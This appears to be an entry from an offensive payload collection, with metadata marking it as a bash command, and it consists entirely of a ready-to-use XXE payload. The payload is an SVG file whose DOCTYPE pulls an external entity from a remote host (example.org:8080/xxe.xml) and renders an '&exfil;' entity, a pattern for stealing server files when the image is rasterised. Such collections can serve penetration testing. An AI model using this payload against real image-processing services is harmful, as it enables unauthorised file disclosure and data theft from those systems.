---
id: 560e660e-c145-432e-9c08-9cc081ace5b6
name: XXE via SVG rasterization
type: command
executor: bash
data: "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n<!ELEMENT svg\
  \ ANY >\n<!ENTITY % sp SYSTEM \"http://example.org:8080/xxe.xml\">\n%sp;\n%param1;\n\
  ]>\n<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\"\
  \ style=\"fill:red\">\n      <text x=\"15\" y=\"100\" style=\"fill:black\">XXE via\
  \ SVG rasterization</text>\n      <rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"\
  200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>\n      <flowRoot font-size=\"\
  15\">\n         <flowRegion>\n           <rect x=\"0\" y=\"0\" width=\"200\" height=\"\
  200\" style=\"fill:red;opacity:0.3\"/>\n         </flowRegion>\n         <flowDiv>\n\
  \            <flowPara>&exfil;</flowPara>\n         </flowDiv>\n      </flowRoot>\n\
  </svg>"
output: null
created_at: '2023-04-06T03:56:44.558969+00:00'
updated_at: '2023-04-10T20:24:37.998801+00:00'
---

# XXE via SVG rasterization

```bash
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```


